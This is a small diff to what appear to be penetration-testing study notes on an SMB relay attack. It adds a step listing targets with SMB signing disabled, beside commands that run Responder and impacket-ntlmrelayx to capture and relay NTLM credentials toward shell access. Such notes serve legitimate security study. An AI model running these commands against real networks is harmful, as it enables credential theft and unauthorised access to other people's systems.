@@ -9,6 +9,7 @@
 	  
 - ==**SMB Relay**== (Look for ***Message/SMB signing disabled or not enforced/required*** in nmap) [[SMB Relay Attack Lab]]
 	- **turn off SMB and HTTP switches** off in **Responder.conf**
+	- **==Enter the list of IPs where you TO relay into `targets.txt` (must have the above SMB Signing criteria)==**
 	- `sudo responder -I tun0 -dwv`
 	- `impacket-ntlmrelayx -tf targets.txt -smb2support`
 - **==Gaining Access (shell) with captured Hash / Password==**
